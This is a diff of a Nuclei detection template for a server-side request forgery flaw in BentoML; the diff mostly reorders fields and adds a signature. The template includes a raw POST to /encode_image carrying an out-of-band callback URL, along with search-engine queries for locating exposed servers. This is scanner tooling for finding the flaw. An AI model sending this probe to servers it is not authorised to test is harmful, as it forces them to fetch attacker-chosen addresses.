@@ -1,5 +1,4 @@
 id: bentoml-ssrf
-
 info:
   name: Bentoml - Server Side Request Forgery
   author: ritikchaddha
@@ -14,18 +13,26 @@ info:
     cwe-id: CWE-918
   metadata:
     runzero-match: any(each(service["http.bodies"]), {# matches "BentoML"})
+    fofa-query: body="BentoML"
     max-request: 1
-    vendor: bentoml
     product: bentoml
     shodan-query: html:"BentoML"
-    fofa-query: body="BentoML"
-  tags: ssrf,bentoml,oast,oob
-
+    vendor: bentoml
+  tags: bentoml,oast,oob,ssrf,vuln
 variables:
-  rand: "{{to_lower(rand_text_alpha(5))}}"
-
+  rand: '{{to_lower(rand_text_alpha(5))}}'
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        # digest: 4b0a00483046022100f4616f4e05b33beadfdde4ee8758250f6668f47ea6e50fbb920c389d74940f590221008beacd43b2e079809ac2cfb5ff76b23579303f3434d7881c24bc0b0657fb2971:922c64590222798bb761d5b6d8e72950
+
+        dsl:
+          - contains(content_type, "application/json")
+          - contains(interactsh_protocol,'http')
+          - contains(body, "error\":")
+          - status_code == 500
+        type: dsl
+    raw:
       - |
         POST /encode_image HTTP/1.1
         Host: {{Hostname}}
@@ -36,13 +43,3 @@ http:
 
         http://{{interactsh-url}}/{{rand}}
         ------WebKitFormBoundaryGqThdiCjrkRXHqIr--
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(content_type, "application/json")'
-          - "contains(interactsh_protocol,'http')"
-          - 'contains(body, "error\":")'
-          - 'status_code == 500'
-        condition: and
-
